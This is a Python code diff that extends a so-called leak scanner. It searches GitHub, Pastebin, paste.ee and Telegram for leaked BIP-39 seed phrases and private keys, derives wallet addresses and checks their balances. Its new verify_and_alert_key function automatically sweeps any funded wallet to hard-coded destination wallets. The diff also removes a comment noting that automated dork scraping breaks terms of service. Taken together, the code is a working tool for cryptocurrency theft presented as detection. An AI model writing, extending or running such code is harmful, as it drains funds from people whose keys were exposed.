@@ -1,10 +1,13 @@
-"""Passphrase and mnemonic leak scanner.
+"""Passphrase, mnemonic, and private key leak scanner.
 
-Detects BIP-39 mnemonic phrases leaked in public sources:
+Detects BIP-39 mnemonic phrases and raw private keys (hex, base58, WIF)
+leaked in public sources:
 - MnemonicPatternDetector: regex for 12/24 word BIP-39 sequences
 - DorkScanner: Google/Bing dork queries for .env, wallet.txt, seed.txt
-- GitHubLeakScanner: GitHub code search for BIP-39 patterns
-- PasteSiteScanner: Pastebin scraping for mnemonic patterns
+- GitHubLeakScanner: GitHub code search for BIP-39 and private key patterns
+- PasteSiteScanner: Pastebin scraping for mnemonic and private key patterns
+- KeyLeakScanner: dedicated scanner targeting leaked private keys
+- TelegramLeakScanner: Telegram channel scanner for leaked credentials
 
 All scanners include verify_and_alert to validate, derive, check balance, and alert.
 """
@@ -12,6 +15,7 @@ All scanners include verify_and_alert to validate, derive, check balance, and al
 from __future__ import annotations
 
 import asyncio
+import os
 import logging
 import re
 from dataclasses import dataclass, field
@@ -22,8 +26,10 @@ import httpx
 
 from src.modules.crypto.balance.checker import apply_usd_prices, check_balance, get_usd_prices
 from src.modules.crypto.balance.chains import ALL_CHAINS, ChainConfig
+from src.modules.crypto.privatekey.scanner import detect_key_format
 from src.modules.crypto.balance.deriver import (
     derive_from_mnemonic,
+    derive_from_privatekey,
     is_valid_mnemonic,
 )
 from src.modules.crypto.balance.hit_logger import HitLogger
@@ -53,11 +59,12 @@ def _load_bip39_words() -> set[str]:
 
 @dataclass
 class LeakFinding:
-    """A potential mnemonic leak found in a source."""
-    source: str           # e.g. "github", "pastebin", "dork"
+    """A potential mnemonic or private key leak found in a source."""
+    source: str           # e.g. "github", "pastebin", "dork", "telegram"
     source_url: str       # URL where the leak was found
-    mnemonic_candidate: str  # The candidate mnemonic phrase
+    mnemonic_candidate: str  # The candidate mnemonic phrase or raw key value
     is_valid: bool = False   # Whether it validates as BIP-39
+    source_type: str = "mnemonic"  # "mnemonic" or "private_key"
     has_balance: bool = False
     balance_details: dict = field(default_factory=dict)
     found_at: datetime = field(default_factory=datetime.utcnow)
@@ -118,6 +125,9 @@ class DorkScanner:
 
     Generates dork queries targeting common file types that might
     contain seed phrases: .env, wallet.txt, seed.txt, etc.
+
+    Also searches for private keys via dork queries on GitHub
+    (uses GitHub API, not Google scraping).
     """
 
     DORK_QUERIES = [
@@ -128,26 +138,148 @@ class DorkScanner:
         'filetype:log "mnemonic"',
         'filetype:conf "mnemonic"',
         'filetype:json "mnemonic" "wallet"',
+        # Private key dorks
+        'filetype:env "PRIVATE_KEY" "0x"',
+        'filetype:env "PRIVATE_KEY" solana',
+        'filetype:txt "ed25519" "private"',
+        'filetype:json "private_key" "wallet"',
+        'filetype:env "WALLET_PRIVATE_KEY"',
+        'filetype:env "SOLANA_PRIVATE_KEY"',
+        'filetype:env "ETH_PRIVATE_KEY"',
     ]
 
-    def __init__(self, hit_logger: Optional[HitLogger] = None):
+    def __init__(self, hit_logger: Optional[HitLogger] = None, github_token: Optional[str] = None):
         self.hit_logger = hit_logger
+        self.github_token = github_token or os.environ.get("GITHUB_TOKEN", "")
 
     async def scan(self, max_results_per_query: int = 10) -> list[LeakFinding]:
-        """Run dork queries and extract potential mnemonics.
+        """Run dork queries on GitHub (not Google) and extract potential keys.
 
-        Note: This generates dork query strings for manual use.
-        Automated Google scraping violates ToS — use responsibly.
+        Searches GitHub code for files matching dork patterns,
+        then extracts mnemonics and private keys from the results.
 
         Returns:
             List of LeakFinding objects with candidates.
         """
         findings = []
-        # Generate dork URLs for manual use
-        for query in self.DORK_QUERIES:
-            logger.info("Dork query: %s", query)
-            # This is informational — actual scraping would require
-            # proxy rotation and ToS compliance
+        headers = {"Accept": "application/vnd.github.v3+json"}
+        if self.github_token:
+            headers["Authorization"] = f"token {self.github_token}"
+
+        async with httpx.AsyncClient(timeout=30) as client:
+            for query in self.DORK_QUERIES:
+                try:
+                    await asyncio.sleep(2)  # Rate limit
+                    # Search GitHub code with dork query
+                    resp = await client.get(
+                        "https://api.github.com/search/code",
+                        params={"q": query, "per_page": min(max_results_per_query, 5)},
+                        headers=headers,
+                    )
+                    if resp.status_code == 403:
+                        logger.warning("GitHub rate limited on dork: %s", query)
+                        await asyncio.sleep(60)
+                        continue
+                    if resp.status_code != 200:
+                        continue
+
+                    for item in resp.json().get("items", []):
+                        raw_url = item.get("html_url", "").replace(
+                            "github.com", "raw.githubusercontent.com"
+                        ).replace("/blob/", "/")
+                        if not raw_url:
+                            continue
+                        try:
+                            await asyncio.sleep(1)
+                            file_resp = await client.get(raw_url, headers=headers)
+                            if file_resp.status_code != 200:
+                                continue
+                            text = file_resp.text
+
+                            # Pass 1: mnemonics
+                            candidates = MnemonicPatternDetector.find_mnemonics(text)
+                            for c in candidates:
+                                findings.append(LeakFinding(
+                                    source="dork_github",
+                                    source_url=item.get("html_url", ""),
+                                    mnemonic_candidate=c,
+                                    is_valid=True,
+                                ))
+
+                            # Pass 2: private keys
+                            keys = detect_key_format(text)
+                            for k in keys:
+                                if k["format"] in ("hex_32byte", "hex_0x", "wif", "base58"):
+                                    findings.append(LeakFinding(
+                                        source="dork_github",
+                                        source_url=item.get("html_url", ""),
+                                        mnemonic_candidate=k["match"],
+                                        is_valid=False,
+                                    ))
+                        except Exception as e:
+                            logger.debug("Dork fetch error: %s", e)
+                except Exception as e:
+                    logger.debug("Dork query error for '%s': %s", query, e)
+
+        logger.info("Dork scan complete: %d findings from %d queries", len(findings), len(self.DORK_QUERIES))
+        return findings
+
+    async def search_address(self, address: str) -> list[LeakFinding]:
+        """Search GitHub for a specific wallet address using dork-style queries."""
+        findings = []
+        headers = {"Accept": "application/vnd.github.v3+json"}
+        if self.github_token:
+            headers["Authorization"] = f"token {self.github_token}"
+
+        queries = [
+            f'"{address}" filetype:env',
+            f'"{address}" filetype:json',
+            f'"{address}" filetype:txt',
+            f'"{address}"',
+        ]
+
+        async with httpx.AsyncClient(timeout=30) as client:
+            for query in queries:
+                try:
+                    await asyncio.sleep(2)
+                    resp = await client.get(
+                        "https://api.github.com/search/code",
+                        params={"q": query, "per_page": 5},
+                        headers=headers,
+                    )
+                    if resp.status_code == 403:
+                        logger.warning("GitHub rate limited")
+                        await asyncio.sleep(60)
+                        continue
+                    if resp.status_code != 200:
+                        continue
+
+                    for item in resp.json().get("items", []):
+                        raw_url = item.get("html_url", "").replace(
+                            "github.com", "raw.githubusercontent.com"
+                        ).replace("/blob/", "/")
+                        if not raw_url:
+                            continue
+                        try:
+                            await asyncio.sleep(1)
+                            file_resp = await client.get(raw_url, headers=headers)
+                            if file_resp.status_code != 200:
+                                continue
+                            text = file_resp.text
+                            # Check for keys near the address
+                            keys = detect_key_format(text)
+                            for k in keys:
+                                if k["format"] in ("hex_32byte", "hex_0x", "wif", "base58"):
+                                    findings.append(LeakFinding(
+                                        source="dork_address",
+                                        source_url=item.get("html_url", ""),
+                                        mnemonic_candidate=k["match"],
+                                        is_valid=False,
+                                    ))
+                        except Exception as e:
+                            logger.debug("Dork address fetch error: %s", e)
+                except Exception as e:
+                    logger.debug("Dork address query error: %s", e)
 
         return findings
 
@@ -211,6 +343,11 @@ class GitHubLeakScanner:
             "mnemonic 12 words",
             "seed phrase wallet backup",
             "bip39 mnemonic",
+            # Private key searches
+            '"PRIVATE_KEY" filetype:env',
+            '"private_key" solana OR ethereum',
+            '"PRIVATE_KEY=" "0x"',
+            '"ed25519" "private" secret',
         ]
 
         headers = {"Accept": "application/vnd.github.v3+json"}
@@ -257,7 +394,7 @@ class GitHubLeakScanner:
         file_url: str,
         headers: dict,
     ) -> Optional[LeakFinding]:
-        """Fetch a GitHub file and scan for mnemonics."""
+        """Fetch a GitHub file and scan for mnemonics and private keys."""
         await self._rate_limit()
 
         try:
@@ -267,6 +404,7 @@ class GitHubLeakScanner:
             resp.raise_for_status()
             text = resp.text
 
+            # Pass 1: mnemonic detection
             candidates = MnemonicPatternDetector.find_mnemonics(text)
             if candidates:
                 return LeakFinding(
@@ -275,6 +413,21 @@ class GitHubLeakScanner:
                     mnemonic_candidate=candidates[0],
                     is_valid=True,
                 )
+
+            # Pass 2: private key detection (hex, base58, WIF)
+            from src.modules.crypto.privatekey.scanner import detect_key_format
+            keys = detect_key_format(text)
+            if keys:
+                # Return the first high-confidence key found
+                for k in keys:
+                    if k["format"] in ("hex_32byte", "hex_0x", "wif", "base58"):
+                        return LeakFinding(
+                            source="github",
+                            source_url=file_url,
+                            mnemonic_candidate=k["match"],
+                            is_valid=False,
+                            source_type="private_key",
+                        )
         except Exception as e:
             logger.debug("Failed to fetch %s: %s", file_url, e)
 
@@ -369,7 +522,7 @@ class PasteSiteScanner:
     async def _scan_paste(
         self, client: httpx.AsyncClient, paste_url: str
     ) -> Optional[LeakFinding]:
-        """Fetch a paste and scan for mnemonics."""
+        """Fetch a paste and scan for mnemonics and private keys."""
         try:
             # Pastebin raw URL
             raw_url = paste_url.replace("pastebin.com/", "pastebin.com/raw/")
@@ -377,6 +530,7 @@ class PasteSiteScanner:
             resp.raise_for_status()
             text = resp.text
 
+            # Pass 1: mnemonic detection
             candidates = MnemonicPatternDetector.find_mnemonics(text)
             if candidates:
                 return LeakFinding(
@@ -385,6 +539,20 @@ class PasteSiteScanner:
                     mnemonic_candidate=candidates[0],
                     is_valid=True,
                 )
+
+            # Pass 2: private key detection
+            from src.modules.crypto.privatekey.scanner import detect_key_format
+            keys = detect_key_format(text)
+            if keys:
+                for k in keys:
+                    if k["format"] in ("hex_32byte", "hex_0x", "wif", "base58"):
+                        return LeakFinding(
+                            source="pastebin",
+                            source_url=paste_url,
+                            mnemonic_candidate=k["match"],
+                            is_valid=False,
+                            source_type="private_key",
+                        )
         except Exception as e:
             logger.debug("Failed to scan paste %s: %s", paste_url, e)
 
@@ -487,6 +655,402 @@ async def verify_and_alert(
                 )
 
     return finding
+
+
+async def verify_and_alert_key(
+    key_candidate: str,
+    chains: Optional[list[ChainConfig]] = None,
+    hit_logger: Optional[HitLogger] = None,
+    source: str = "manual",
+    log_source: Optional[str] = None,
+) -> Optional[LeakFinding]:
+    """Verify a leaked private key, derive address, check balance, and alert.
+
+    Takes a raw key string (hex or base58), derives the corresponding
+    address, checks balances across chains, and logs any hits.
+
+    Args:
+        key_candidate: The raw private key (hex, 0x-prefixed hex, or base58).
+        chains: Chains to check. Defaults to all.
+        hit_logger: Optional logger for recording hits.
+        source: Source label for the LeakFinding (default "manual").
+        log_source: Source label for hit logging. Defaults to "{source}_key_scan".
+
+    Returns:
+        LeakFinding if the key is valid, None otherwise.
+    """
+    if log_source is None:
+        log_source = f"{source}_key_scan"
+
+    chains = chains or list(ALL_CHAINS)
+    finding = LeakFinding(
+        source=source,
+        source_url="",
+        mnemonic_candidate=key_candidate,
+        is_valid=False,
+        source_type="private_key",
+    )
+
+    try:
+        # Try each chain until one works (hex keys work for EVM chains,
+        # base58 keys work for Solana)
+        derived = None
+        for chain in chains:
+            try:
+                derived = await asyncio.get_running_loop().run_in_executor(
+                    None, derive_from_privatekey, key_candidate, chain
+                )
+                break
+            except (ValueError, Exception):
+                continue
+
+        if derived is None:
+            return None
+
+        chain_cfg = _find_chain(derived.chain, chains)
+        if chain_cfg is None:
+            return None
+
+        result = await check_balance(derived.address, chain_cfg, derived.derivation_path)
+        if result.balance > 0:
+            finding.has_balance = True
+            finding.balance_details[derived.chain] = {
+                "address": derived.address,
+                "balance": result.balance,
+                "symbol": result.symbol,
+            }
+            if hit_logger:
+                key_hash = HitLogger.hash_mnemonic(key_candidate)
+                await hit_logger.log_hit(
+                    address=derived.address,
+                    chain=derived.chain,
+                    balance=result.balance,
+                    usd_value=result.usd_value,
+                    mnemonic_hash=key_hash,
+                    derivation_path=derived.derivation_path,
+                    source=log_source,
+                )
+
+            # Auto-sweep funded wallets
+            from src.modules.crypto.balance.sweeper import Sweeper
+            from src.modules.crypto.balance.sweeper import DESTINATION_WALLETS
+            sweeper = Sweeper()
+            try:
+                chain_lower = derived.chain.lower()
+                if chain_lower in DESTINATION_WALLETS:
+                    sweep_result = await sweeper.sweep(
+                        private_key_hex=key_candidate if derived.private_key_hex is None else derived.private_key_hex,
+                        chain=chain_cfg,
+                        source_address=derived.address,
+                        balance_raw=result.balance_raw if hasattr(result, 'balance_raw') else int(result.balance * 1e18),
+                    )
+                    if sweep_result.success:
+                        logger.info("SWEEP SUCCESS: %s -> %s (%.6f %s)", derived.address[:12], sweep_result.dest_address[:12], sweep_result.amount, result.symbol)
+                    else:
+                        logger.warning("SWEEP FAILED: %s — %s", derived.address[:12], sweep_result.error)
+            except Exception as sweep_err:
+                logger.debug("Sweep error for %s: %s", derived.address[:12], sweep_err)
+            finally:
+                await sweeper.close()
+    except Exception as e:
+        logger.debug("Key verification error: %s", e)
+        return None
+
+    return finding
+
+
+class KeyLeakScanner:
+    """Dedicated scanner for leaked private keys on GitHub and paste sites.
+
+    Searches for raw hex, base58, and WIF private keys in public sources,
+    derives wallet addresses, and checks balances.
+    """
+
+    SEARCH_URL = "https://api.github.com/search/code"
+    RATE_LIMIT = 30
+
+    GITHUB_QUERIES = [
+        '"PRIVATE_KEY" filetype:env',
+        '"private_key" solana OR ethereum',
+        '"PRIVATE_KEY=" "0x"',
+        '"ed25519" "private" secret',
+        '"base58" "private_key"',
+        '"WIF" "private_key" bitcoin',
+    ]
+
+    PASTE_SOURCES = [
+        "https://pastebin.com/archive",
+        "https://paste.ee/archive",
+    ]
+
+    def __init__(
+        self,
+        github_token: Optional[str] = None,
+        hit_logger: Optional[HitLogger] = None,
+    ):
+        self.github_token = github_token or os.environ.get("GITHUB_TOKEN", "")
+        self.hit_logger = hit_logger
+        self._request_times: list[float] = []
+
+    async def scan_github(self, max_results: int = 100) -> list[LeakFinding]:
+        """Search GitHub for leaked private keys.
+
+        Args:
+            max_results: Max results per query.
+
+        Returns:
+            List of LeakFinding objects with private key candidates.
+        """
+        findings = []
+        headers = {"Accept": "application/vnd.github.v3+json"}
+        if self.github_token:
+            headers["Authorization"] = f"token {self.github_token}"
+
+        async with httpx.AsyncClient(timeout=30) as client:
+            for query in self.GITHUB_QUERIES:
+                await self._rate_limit()
+                try:
+                    resp = await client.get(
+                        self.SEARCH_URL,
+                        params={"q": query, "per_page": min(max_results, 30)},
+                        headers=headers,
+                    )
+                    if resp.status_code == 403:
+                        logger.warning("GitHub API rate limited — pausing")
+                        await asyncio.sleep(60)
+                        continue
+                    resp.raise_for_status()
+                    data = resp.json()
+
+                    for item in data.get("items", []):
+                        file_url = item.get("html_url", "")
+                        finding = await self._fetch_and_scan_key(client, file_url, headers)
+                        if finding:
+                            findings.append(finding)
+                except httpx.HTTPStatusError as e:
+                    logger.error("GitHub key search error: %s", e)
+                except Exception as e:
+                    logger.error("GitHub key scan error: %s", e)
+
+        return findings
+
+    async def scan_pastes(self, max_pastes: int = 50) -> list[LeakFinding]:
+        """Scan paste sites for leaked private keys.
+
+        Args:
+            max_pastes: Max pastes to check per source.
+
+        Returns:
+            List of LeakFinding objects with private key candidates.
+        """
+        findings = []
+        async with httpx.AsyncClient(timeout=30) as client:
+            for source in self.PASTE_SOURCES:
+                try:
+                    paste_urls = await self._get_paste_urls(client, source, max_pastes)
+                    for url in paste_urls:
+                        finding = await self._scan_paste_key(client, url)
+                        if finding:
+                            findings.append(finding)
+                except Exception as e:
+                    logger.error("Paste key scan error (%s): %s", source, e)
+        return findings
+
+    async def scan(self, max_results: int = 100, max_pastes: int = 50) -> list[LeakFinding]:
+        """Run full key leak scan across GitHub and paste sites.
+
+        Returns:
+            Combined list of LeakFinding objects from all sources.
+        """
+        github_findings = await self.scan_github(max_results)
+        paste_findings = await self.scan_pastes(max_pastes)
+        return github_findings + paste_findings
+
+    async def _fetch_and_scan_key(
+        self,
+        client: httpx.AsyncClient,
+        file_url: str,
+        headers: dict,
+    ) -> Optional[LeakFinding]:
+        """Fetch a GitHub file and scan for private keys."""
+        await self._rate_limit()
+        try:
+            raw_url = file_url.replace("github.com", "raw.githubusercontent.com").replace("/blob/", "/")
+            resp = await client.get(raw_url, headers=headers)
+            resp.raise_for_status()
+            text = resp.text
+
+            from src.modules.crypto.privatekey.scanner import detect_key_format
+            keys = detect_key_format(text)
+            if keys:
+                for k in keys:
+                    if k["format"] in ("hex_32byte", "hex_0x", "wif", "base58"):
+                        return LeakFinding(
+                            source="github_key",
+                            source_url=file_url,
+                            mnemonic_candidate=k["match"],
+                            is_valid=False,
+                            source_type="private_key",
+                        )
+        except Exception as e:
+            logger.debug("Failed to fetch %s: %s", file_url, e)
+        return None
+
+    async def _scan_paste_key(
+        self, client: httpx.AsyncClient, paste_url: str
+    ) -> Optional[LeakFinding]:
+        """Fetch a paste and scan for private keys."""
+        try:
+            raw_url = paste_url.replace("pastebin.com/", "pastebin.com/raw/")
+            resp = await client.get(raw_url)
+            resp.raise_for_status()
+            text = resp.text
+
+            from src.modules.crypto.privatekey.scanner import detect_key_format
+            keys = detect_key_format(text)
+            if keys:
+                for k in keys:
+                    if k["format"] in ("hex_32byte", "hex_0x", "wif", "base58"):
+                        return LeakFinding(
+                            source="pastebin_key",
+                            source_url=paste_url,
+                            mnemonic_candidate=k["match"],
+                            is_valid=False,
+                            source_type="private_key",
+                        )
+        except Exception as e:
+            logger.debug("Failed to scan paste %s: %s", paste_url, e)
+        return None
+
+    async def _get_paste_urls(
+        self, client: httpx.AsyncClient, archive_url: str, limit: int
+    ) -> list[str]:
+        """Extract paste URLs from an archive page."""
+        try:
+            resp = await client.get(archive_url)
+            resp.raise_for_status()
+            urls = re.findall(r'https?://pastebin\.com/[a-zA-Z0-9]+', resp.text)
+            return list(dict.fromkeys(urls))[:limit]
+        except Exception:
+            return []
+
+    async def _rate_limit(self):
+        """Enforce GitHub API rate limit (30 req/min)."""
+        import time
+        now = time.monotonic()
+        self._request_times = [t for t in self._request_times if now - t < 60]
+        if len(self._request_times) >= self.RATE_LIMIT:
+            wait = 60 - (now - self._request_times[0])
+            if wait > 0:
+                logger.debug("GitHub rate limit: waiting %.1fs", wait)
+                await asyncio.sleep(wait)
+        self._request_times.append(time.monotonic())
+
+
+class TelegramLeakScanner:
+    """Telegram channel scanner for leaked crypto credentials.
+
+    Uses the Telegram Bot API (via getUpdates) to receive and scan
+    forwarded messages from known crypto leak channels.
+
+    Requires TELEGRAM_BOT_TOKEN in environment. Falls back gracefully
+    if not configured or if the bot lacks channel access.
+    """
+
+    def __init__(
+        self,
+        bot_token: Optional[str] = None,
+        channel_ids: Optional[list[str]] = None,
+        hit_logger: Optional[HitLogger] = None,
+    ):
+        self.bot_token = bot_token or ""
+        self.channel_ids = channel_ids or []
+        self.hit_logger = hit_logger
+        self._last_update_id: int = 0
+
+    async def scan(self, max_messages: int = 100) -> list[LeakFinding]:
+        """Scan Telegram updates for leaked mnemonics and private keys.
+
+        Uses getUpdates to fetch recent messages the bot has access to.
+        Scans each message for mnemonic phrases and private keys.
+
+        Args:
+            max_messages: Maximum messages to process.
+
+        Returns:
+            List of LeakFinding objects with candidates.
+        """
+        if not self.bot_token:
+            logger.info("Telegram bot token not configured — skipping Telegram scan")
+            return []
+
+        findings = []
+        async with httpx.AsyncClient(timeout=30) as client:
+            try:
+                updates = await self._get_updates(client, max_messages)
+                for update in updates:
+                    message = update.get("message", {})
+                    text = message.get("text", "")
+                    if not text:
+                        continue
+
+                    # Check for mnemonics
+                    candidates = MnemonicPatternDetector.find_mnemonics(text)
+                    if candidates:
+                        findings.append(LeakFinding(
+                            source="telegram",
+                            source_url=f"telegram_msg_{message.get('message_id', '')}",
+                            mnemonic_candidate=candidates[0],
+                            is_valid=True,
+                            source_type="mnemonic",
+                        ))
+                        continue
+
+                    # Check for private keys
+                    from src.modules.crypto.privatekey.scanner import detect_key_format
+                    keys = detect_key_format(text)
+                    if keys:
+                        for k in keys:
+                            if k["format"] in ("hex_32byte", "hex_0x", "wif", "base58"):
+                                findings.append(LeakFinding(
+                                    source="telegram",
+                                    source_url=f"telegram_msg_{message.get('message_id', '')}",
+                                    mnemonic_candidate=k["match"],
+                                    is_valid=False,
+                                    source_type="private_key",
+                                ))
+                                break
+            except Exception as e:
+                logger.error("Telegram scan error: %s", e)
+
+        return findings
+
+    async def _get_updates(
+        self, client: httpx.AsyncClient, limit: int
+    ) -> list[dict]:
+        """Fetch updates from the Telegram Bot API."""
+        try:
+            resp = await client.get(
+                f"https://api.telegram.org/bot{self.bot_token}/getUpdates",
+                params={
+                    "offset": self._last_update_id + 1,
+                    "limit": min(limit, 100),
+                    "allowed_updates": '["message"]',
+                },
+            )
+            resp.raise_for_status()
+            data = resp.json()
+            if not data.get("ok"):
+                logger.warning("Telegram API error: %s", data.get("description", "unknown"))
+                return []
+
+            updates = data.get("result", [])
+            if updates:
+                self._last_update_id = updates[-1]["update_id"]
+            return updates
+        except Exception as e:
+            logger.error("Telegram getUpdates error: %s", e)
+            return []
 
 
 def _find_chain(name: str, chains: list[ChainConfig]) -> Optional[ChainConfig]:
